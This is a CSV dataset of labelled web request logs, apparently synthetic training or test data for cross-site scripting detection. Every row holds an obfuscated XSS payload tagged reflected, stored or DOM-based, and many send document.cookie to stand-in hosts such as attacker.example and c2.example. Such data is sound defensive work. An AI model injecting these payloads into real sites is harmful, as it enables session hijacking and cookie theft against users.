time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-09-08T16:58:29Z,157.194.204.170,37.85.58.9:443,GET,"/product?id=<a HrEf=""JavAScRipt:alERt(1)"">viEW</a>","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://duckduckgo.com/,CV2hpy4Qm8jXsdsa44,0,7e0237cef341,5,1,reflected,True,False,False,,
2023-09-08T16:58:29Z,157.194.204.170,37.85.58.9:443,GET,/search?id=%3CsvG sRC=1 oNloAD=promPt(1)%3E,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://www.bing.com/,C51NyIk2aoNLcCkgh,0,7e0237cef341,6,1,reflected,True,False,False,,
2023-09-08T16:58:29Z,157.194.204.170,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",comment=<VIdEO Src=x ONeRRor=alErT(1)>&name=guest,https://www.bing.com/,C8pYh42NbmGrbVq9li,0,7e0237cef341,7,1,stored,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,GET,/catalog?id=JAVaScript:conFIRM(1),"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,,CFnVv12mMU3dy5sdU2,0,7e0237cef341,8,1,dom_based,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,GET,/product?redirect=#%3Cscr%3Cscript%3Eipt%3Ealert(window.location)%3C/script%3E,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,,CeB7n1SI5GdYvHQ5d,0,7e0237cef341,9,1,dom_based,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,GET,/filter?id=#<ScRiPt>aLERt(1)</sCRIPt>,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://duckduckgo.com/,CfD3CZ1okfDOg1N6n3,0,7e0237cef341,10,1,dom_based,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",comment=#<iMg sRC=x oNeRRor=aLerT(NavIgAtOr.UserAGeNT)>&name=guest,https://duckduckgo.com/,CRtnPq4fUSNKNUgoGh,0,7e0237cef341,11,1,dom_based,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,GET,/lookup?redirect=%3CMaRqUeE ONSTArT=AleRT(wINDOW.LocaTion)%3E,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,-,Cpnlca15eKXiXQisQd,0,7e0237cef341,12,1,stored,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,GET,/lookup?term=%3Caudio src=x onerror=console.log(document.cookie)%3E,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,-,Cl824n3h28FRCbZEdc,0,7e0237cef341,13,1,stored,True,False,False,,
2023-09-08T16:59:02Z,157.194.204.170,37.85.58.9:443,GET,/redirect?query=<maRqueE onSTart=COnfiRM(1)>,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://www.bing.com/,C6uJE52AxR0TKSHqk,0,7e0237cef341,14,1,reflected,True,False,False,,
2023-09-08T17:08:07Z,23.126.207.219,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=%3Cscr%3Cscript%3Eipt%3Enew Image().src='http://c2.example/grab?token='+document.cookie%3C/script%3E&name=guest,-,CLEplJINMKzaCJFI6,0,8344540b0d66,1,1,stored,True,False,False,,
2023-09-08T17:08:07Z,23.126.207.219,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=<scRIPT>FetCh('HTTP://attAcKer.ExaMPLe/BEACon?d='+dOCUMEnt.COokIE)</Script>&name=guest,https://www.bing.com/,CdC83r2pfeXi2JRuZk,0,8344540b0d66,2,1,stored,True,False,False,,
2023-09-08T17:08:07Z,23.126.207.219,37.85.58.9:443,GET,/catalog?term=%3CvideO srC=X OnErroR=COnFIrM('xSs')%3E,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,-,CvgVHh3dioom3z7gll,0,8344540b0d66,3,1,stored,True,False,False,,
2023-09-08T17:08:07Z,23.126.207.219,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=JaVasCRiPt:ALErt(2)&name=guest,https://duckduckgo.com/,C2aMzu1fZ6T1LexXof,0,8344540b0d66,4,1,dom_based,True,False,False,,
2023-09-08T17:08:07Z,23.126.207.219,37.85.58.9:443,POST,/support/ticket,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=#%3CSvg oNlOAd=AlErT(docUMENT.DOMAIn)%3E&name=guest,,CJTI5c4EnizhFBrahh,0,8344540b0d66,5,1,dom_based,True,False,False,,
2023-09-08T17:08:07Z,23.126.207.219,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=<scr<script>ipt>document.location='http://exfil.example/grab?data='+document.cookie</script>&name=guest,-,CPrWsV3iBtYkykP9Lk,0,8344540b0d66,6,1,stored,True,False,False,,
2023-09-08T17:08:08Z,23.126.207.219,37.85.58.9:443,GET,/search?name=%3Cscript%3Enew Image().src='http://collector.example/c?token='+document.cookie%3C/script%3E,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,CASjP71YcU4FaO21Pj,0,8344540b0d66,7,1,stored,True,False,False,,
2023-09-09T14:06:05Z,5.76.98.74,37.85.58.9:443,POST,/support/ticket,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<InpuT AUtOFOCus ONfOCus=aLERT(DOcUmenT.CoOkiE)>&name=guest,https://www.bing.com/,CS1pjl4XCgbT8X5zah,0,0227e7aa3cd3,1,1,reflected,True,False,False,,
2023-09-09T14:06:05Z,5.76.98.74,37.85.58.9:443,GET,/lookup?term=<sCrIpT>feTcH('HTTP://eViL.eXAmpLE/bEacON?daTa='+DoCuMEnT.CooKiE)</ScrIpt>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,CxAAJ5nTqFkeF4rki,0,0227e7aa3cd3,2,1,stored,True,False,False,,
2023-09-09T14:06:05Z,5.76.98.74,37.85.58.9:443,GET,/product?id=<AUDIo srC=X ONERroR=AleRT(wINDOW.LocatIoN)>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,C2rMkT2VpWzH8OpdSh,0,0227e7aa3cd3,3,1,stored,True,False,False,,
2023-09-09T14:06:05Z,5.76.98.74,37.85.58.9:443,GET,/browse?id=<scriPT>FETCH('http://cOLleCtoR.ExAmplE/C?D='+DOCUMenT.coOkie)</sCRipT>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,Cbc4BO1kJaioqCiori,0,0227e7aa3cd3,4,1,stored,True,False,False,,
2023-09-09T14:06:05Z,5.76.98.74,37.85.58.9:443,GET,/product?term=#<SCRiPt>ALerT(docUMENT.cookIE)</scRIpT>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,CNP5YD4cKpdDPa4wBi,0,0227e7aa3cd3,5,1,dom_based,True,False,False,,
2023-09-09T14:06:06Z,5.76.98.74,37.85.58.9:443,GET,/lookup?ref=<sCRIpt>PRoMPt('xSS')</SCRIPt>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,CAdv8M22EZAOmpV6Zi,0,0227e7aa3cd3,6,1,reflected,True,False,False,,
2023-09-09T14:06:06Z,5.76.98.74,37.85.58.9:443,GET,/filter?term=<Svg><scrIPt>AlErt(window.lOcaTiON)</scripT></sVG>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,CTBhJH3eoble83jfD8,0,0227e7aa3cd3,7,1,reflected,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,GET,"/search?search=<a HreF=""JaVasCRIPt:prOmpt(1)"">CLICK</A>","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.bing.com/,Ccf2Kp39lY5bOlLjMi,0,851026efb85b,1,1,reflected,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,GET,"/browse?query=<a hReF=""JAvaScRiPt:PrOmpT(1)"">ClicK</A>","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,-,C6A4lo3vbBDuVXFWH2,0,851026efb85b,2,1,reflected,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<scrIPt>nEW iMAGE().SRc='HTTP://EXFil.EXamPlE/cOLLeCt?D='+DoCUment.CooKiE</sCrIpT>&name=guest,https://www.google.com/,CH5JYagnhccA5DS4b,0,851026efb85b,3,1,stored,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=#<SCripT>ConfIrm(1)</script>&name=guest,,Cn30GI13UeW5XeBfAl,0,851026efb85b,4,1,dom_based,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=%3Cscript%3Efetch('http://evil.example/c?token='+document.cookie)%3C/script%3E&name=guest,https://duckduckgo.com/,CRCDUz4rnuDIP5nJel,0,851026efb85b,5,1,stored,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,GET,/catalog?ref=#%3CScrIpt%3EaleRT('PWN')%3C/SCRipT%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.bing.com/,CqDY7t2Cd30fwHu6y3,0,851026efb85b,6,1,dom_based,True,False,False,,
2023-09-09T14:23:51Z,83.114.66.93,37.85.58.9:443,GET,/search?name=#<ScRIPt>aleRt(1337)</sCRiPt>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,,CxCTbO2GCnJA0yNWb1,0,851026efb85b,7,1,dom_based,True,False,False,,
2023-09-09T14:40:44Z,56.160.245.186,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<SCripT>PromPt('XsS')</ScRIPt>&name=guest,-,CbltvU20HRwGN3Tne,0,43ad2a8340b2,1,1,reflected,True,False,False,,
2023-09-09T14:40:44Z,56.160.245.186,37.85.58.9:443,GET,/filter?ref=<scRiPt>aLerT(WINDoW.LoCATiON)</scrIpT>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,CMkobTLKAZ2VTIt7,0,43ad2a8340b2,2,1,reflected,True,False,False,,
2023-09-09T14:40:44Z,56.160.245.186,37.85.58.9:443,GET,/filter?term=<scr<script>ipt>fetch('http://listener.example/collect?data='+document.cookie)</script>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,CXVGhW3JuK0OMUmvDb,0,43ad2a8340b2,3,1,stored,True,False,False,,
2023-09-09T14:40:44Z,56.160.245.186,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<FORm onSUbmit=aLerT(DOcuMEnT.COOKie)>&name=guest,,Cq63hr2oTluJeE8Nq,0,43ad2a8340b2,4,1,reflected,True,False,False,,
2023-09-09T14:40:44Z,56.160.245.186,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=jAvaScRiPt:conSOLE.lOg(DocuMENt.cookie)&name=guest,,ChPHMp3HmhPxKfbpc6,0,43ad2a8340b2,5,1,dom_based,True,False,False,,
2023-09-09T14:40:44Z,56.160.245.186,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=#%3CIMG SrC=x oneRrOr=coNSOle.Log(DoCumENT.coOKIe)%3E&name=guest,https://www.google.com/,CnckKv1fIPXriRbEeb,0,43ad2a8340b2,6,1,dom_based,True,False,False,,
2023-09-09T14:40:45Z,56.160.245.186,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=#<sCRipt>AleRT(LOCalsTOrAgE.lENGTh)</scriPt>&name=guest,-,CrC8aZ1gA8kL0sIKd8,0,43ad2a8340b2,7,1,dom_based,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,GET,/search?redirect=<MarQueE OnStaRT=AlErt('Pwn')>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,Cih4yX3VtWz9zCLoOc,0,c32f07978eb9,1,1,reflected,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,GET,/search?query=#%3CSVG ONloAD=PROMPT(1)%3E,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,ChppSw2VGkqb5UKS64,0,c32f07978eb9,2,1,dom_based,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,GET,/filter?redirect=#<ScRIPT>aleRT(2)</ScriPT>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,Cytn9p4i2cTrbZQjjf,0,c32f07978eb9,3,1,dom_based,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,GET,/lookup?q=<marQuEe OnStart=aLerT(DocumeNT.dOMaiN)>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,CWX3Et3NTjLHs7Ram,0,c32f07978eb9,4,1,stored,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=<SvG><sCRIPt>ALert('Pwn')</ScrIpt></sVg>&name=guest,https://duckduckgo.com/,CgGHhw4WGodvC9xkl2,0,c32f07978eb9,5,1,reflected,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=<ScRIpt>New iMaGe().sRc='hTtP://listENer.eXamPle/gRAb?DatA='+doCUmENT.COokIE</scRipt>&name=guest,https://www.google.com/,CRMTQ93KsCeWEHxVTb,0,c32f07978eb9,6,1,stored,True,False,False,,
2023-09-09T14:47:08Z,128.166.166.242,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=#<ImG SRc=X ONerRoR=ALert(LOCALsTorAgE.LENGTh)>&name=guest,,Cc1PWW33FLEk4DHVof,0,c32f07978eb9,7,1,dom_based,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<teXtarEa auTofOcUS OnFOCus=COnsOle.LOg(DoCUmENT.COOkIE)>&name=guest,,CpRFjUnPgKeRszKak,0,71b5f6619ed1,1,1,stored,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,GET,/lookup?name=#<IMg srC=x OneRROr=ALErt('XSs')>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,CZkwY73yN5UqsNCAv8,0,71b5f6619ed1,2,1,dom_based,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<scr<script>ipt>fetch('http://attacker.example/c?data='+document.cookie)</script>&name=guest,,CI7wL11rIzIBcbgfs9,0,71b5f6619ed1,3,1,stored,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,GET,/redirect?term=<INpUt aUTOFocUs ONfOcuS=ALeRt('pWn')>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,CFvz9j2YvH6x5kwbDk,0,71b5f6619ed1,4,1,stored,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,GET,/search?query=%3Cscript%3Edocument.location='http://c2.example/collect?token='+document.cookie%3C/script%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,C0ArrD3EMCcDPXz9cb,0,71b5f6619ed1,5,1,stored,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,GET,/catalog?name=%3CscrIPT%3EConsoLE.Log(docUMENT.COOkIE)%3C/scrIPt%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,CZoZjE4fZvXcuaFhNi,0,71b5f6619ed1,6,1,reflected,True,False,False,,
2023-09-09T15:04:36Z,194.28.131.153,37.85.58.9:443,POST,/support/ticket,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<sCriPt>feTCh('HtTp://EXfiL.eXamPLe/C?c='+dOCuMeNT.cooKIE)</SCrIpT>&name=guest,-,Cm5ml8f8OW6vn39g5,0,71b5f6619ed1,7,1,stored,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,POST,/support/ticket,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<IMG SrC=X ONERROR=aleRt(1337)>&name=guest,https://www.bing.com/,CfQlpXwmXc9M1G82a,0,edaae256b34e,1,1,stored,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<sCrIpt>DOcuMEnt.loCAtion='hTTp://eviL.EXamPle/graB?tokEN='+dOCumenT.coOkIE</scriPT>&name=guest,https://www.google.com/,CNx7WvagiOtwyCPV5,0,edaae256b34e,2,1,stored,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,GET,/redirect?search=%3Cscript%3Efetch('http://listener.example/c?ck='+document.cookie)%3C/script%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,,CMDC1nGPEl8nDwtH4,0,edaae256b34e,3,1,stored,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,GET,/filter?term=javasCrIPt:aleRT(1),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,,C8460t4mfPr7XteIe2,0,edaae256b34e,4,1,dom_based,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,GET,/product?term=<ScRiPt>coNFIrM('xss')</ScRIPt>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.google.com/,C1b7wr4yVyYzmxxRp2,0,edaae256b34e,5,1,reflected,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=jaVaScripT:ALerT(1)&name=guest,https://www.google.com/,CqjVCz1bSa9xrK9xGg,0,edaae256b34e,6,1,dom_based,True,False,False,,
2023-09-09T15:08:05Z,80.109.31.138,37.85.58.9:443,GET,/filter?name=#<sCRIpT>alerT('PwN')</scRIpt>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,,CRvvNA4xmnMhbAw1s3,0,edaae256b34e,7,1,dom_based,True,False,False,,
2023-09-09T15:11:51Z,123.68.76.204,37.85.58.9:443,GET,/search?term=<scr<script>ipt>document.location='http://evil.example/log?data='+document.cookie</script>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,ChFnrFdAKNSql3i89,0,f4470dc67153,1,1,stored,True,False,False,,
2023-09-09T15:11:51Z,123.68.76.204,37.85.58.9:443,GET,/catalog?redirect=<sVg><ScRIpT>alErt(2)</sCRIpT></sVG>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,CdmyIq4m52oTLZq5X5,0,f4470dc67153,2,1,reflected,True,False,False,,
2023-09-09T15:11:51Z,123.68.76.204,37.85.58.9:443,GET,/catalog?ref=<ScRIPt>alerT('pwN')</ScRIPT>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,CddGMq1KVmHLNOoKdl,0,f4470dc67153,3,1,reflected,True,False,False,,
2023-09-09T15:11:51Z,123.68.76.204,37.85.58.9:443,GET,/search?id=<ScripT>feTch('HtTP://c2.eXamPlE/grAB?d='+DOCUMEnT.cOOKIE)</scrIPT>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,CzqBVu3r0jXQLP58Bk,0,f4470dc67153,4,1,stored,True,False,False,,
2023-09-09T15:11:51Z,123.68.76.204,37.85.58.9:443,GET,/catalog?q=<TextAReA AUtOfocUS OnFoCUs=alErt(DOCUMENT.DOmaIN)>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,C8jcIY8eunqnBm86b,0,f4470dc67153,5,1,stored,True,False,False,,
2023-09-09T15:11:51Z,123.68.76.204,37.85.58.9:443,GET,/lookup?name=<ScRIPT>neW imAGe().Src='htTP://CollectOr.exaMPle/COlLEcT?C='+DOcUmEnt.coOKiE</ScRipt>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,,CLVCQc1oMC1nOuPijl,0,f4470dc67153,6,1,stored,True,False,False,,
2023-09-09T15:11:52Z,123.68.76.204,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=jAvascRipT:ConFirm(1)&name=guest,,Ci9O9wEWc8jCI9GJ8,0,f4470dc67153,7,1,dom_based,True,False,False,,
2023-09-09T15:24:06Z,67.115.170.102,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",comment=<svg><SCRiPT>ALErT('pWn')</SCrIPt></SvG>&name=guest,https://www.google.com/,CXCDQy2ztBJvi53Ug8,0,7bc33109e1bc,1,1,reflected,True,False,False,,
